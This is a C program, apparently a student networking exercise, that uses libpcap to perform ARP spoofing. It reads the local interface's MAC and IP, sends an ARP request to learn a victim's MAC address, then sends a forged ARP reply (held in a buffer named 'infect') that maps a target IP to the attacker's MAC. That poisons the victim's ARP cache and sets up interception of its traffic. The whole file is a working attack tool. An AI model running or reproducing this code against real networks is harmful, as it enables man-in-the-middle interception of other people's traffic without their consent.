// Developer: ming
// platform: Ubuntu 16.04.2
// Reference : http://www.binarytides.com/c-program-to-get-ip-address-from-interface-name-on-linux/
// Reference : http://www.programming-pcap.aldabaknocking.com/code/arpsniffer.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h> // ifreq
#include <unistd.h> // close
#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/ethernet.h>

/* ARP Header, (assuming Ethernet+IPv4)                   */ 
#define ETHERNET 1
#define ARP_REQUEST 1          /* ARP Request             */ 
#define ARP_REPLY 2            /* ARP Reply               */ 
#define PACKET_SIZE 42	       /* Packet Size	 	  */
#define ETHER_HLEN 14	       /* ethernet header size    */
typedef struct arpheader { 
    uint16_t htype;            /* Hardware Type           */ 
    uint16_t ptype;            /* Protocol Type           */ 
    uint8_t hlen;              /* Hardware Address Length */ 
    uint8_t plen;      	       /* Protocol Address Length */ 
    uint16_t oper;	       /* Operation Code          */ 
    uint8_t sha[6];            /* Sender hardware address */ 
    uint32_t spa;              /* Sender IP address       */ 
    uint8_t tha[6];            /* Target hardware address */ 
    uint32_t tpa;              /* Target IP address       */ 
} __attribute__((packed)) arphdr_t; 

int main(int argc, char *argv[])
{
	int fd;
	struct ifreq ifr;
	unsigned char attacker_mac[6];
	const char *attacker_ip;
	char *dev, *sender_ip, *target_ip;
	
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	int res;
	struct pcap_pkthdr *header;
	const u_char *reply_packet;

	struct ether_header *ethhdr;
	char packet[100];
	char infect[100];

	arphdr_t *arpheader = NULL;

	struct ether_header *reply_eth;
	arphdr_t *reply_arp;
	unsigned char sender_mac[6]; 

	if (argc != 4) {
		printf("input needed: <dev> <sender_ip> <target_ip> \n");
		exit(1);
	}

	dev = argv[1];
	sender_ip = argv[2];
	target_ip = argv[3];

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) perror("socket fail");

	/* Copy the interface name in the ifreq structure */
	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) perror("ioctl fail");

	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
 
	/* Get ip address */
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	attacker_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

	/* Open network device for packet capture */ 
	if((handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf))==NULL) {
		printf("Couldn't open device %s : %s\n", dev, errbuf);
		return 2;
	}

	/* Make Ethernet packet */
	ethhdr = (struct ether_header *)packet;
	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = '\xff';
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
	
	/* Make ARP packet */
	arpheader = (struct arpheader *)(packet+14);
	arpheader->htype = ntohs(ETHERNET);
	arpheader->ptype = ntohs(ETHERTYPE_IP);
	arpheader->hlen = sizeof(arpheader->sha); 
	arpheader->plen = sizeof(arpheader->spa);
	arpheader->oper = ntohs(ARP_REQUEST);
	memcpy(arpheader->sha, attacker_mac, 6);
	arpheader->spa = inet_addr(attacker_ip);
	memcpy(arpheader->tha, "\x00\x00\x00\x00\x00\x00",6);
	arpheader->tpa = inet_addr(sender_ip);

	/* Send ARP request */
	pcap_sendpacket(handle, packet, PACKET_SIZE);	
	/* int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
	 * sends a raw packet through the network interface.
	 * returns 0 on success and -1 on failure.
	 * If -1 is returned, pcap_geterr() or pcap_perror() may be called 
	 * with p as an argument to fetch or display the error text.
	 */

	/* Get ARP reply */
	while(1) {
		res = pcap_next_ex(handle, &header, &reply_packet);
		if(res < 0) exit(1);
		else if(res == 0) {
			//if(pcap_sendpacket(handle, packet, PACKET_SIZE)) {
                	//	exit(1);
           		//}
			continue;
		}

		reply_eth = (struct ether_header *)reply_packet;
		if(reply_eth->ether_type != htons(ETHERTYPE_ARP)) continue;
		
		reply_arp = (struct arphdr_t *)(reply_packet + ETHER_HLEN);	
		// error handling
		
		memcpy(sender_mac, reply_arp->sha, 6);
		break;
	}

	//printf("%x %x %x %x %x %x \n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); 

	/* Make Ethernet packet */
	ethhdr = (struct ether_header *)infect;
	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = sender_mac[i];
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
	
	/* Make ARP packet */
	arpheader = (struct arpheader *)(infect+14);
	arpheader->htype = ntohs(ETHERNET);
	arpheader->ptype = ntohs(ETHERTYPE_IP);
	arpheader->hlen = sizeof(arpheader->sha); 
	arpheader->plen = sizeof(arpheader->spa);
	arpheader->oper = ntohs(ARP_REPLY);
	memcpy(arpheader->sha, attacker_mac, 6);
	arpheader->spa = inet_addr(target_ip);
	memcpy(arpheader->tha, sender_mac,6);
	arpheader->tpa = inet_addr(sender_ip);

	/* Send ARP request */
	pcap_sendpacket(handle, infect, PACKET_SIZE);			

	/* Close handle */
	pcap_close(handle);
	
	return 0;
}
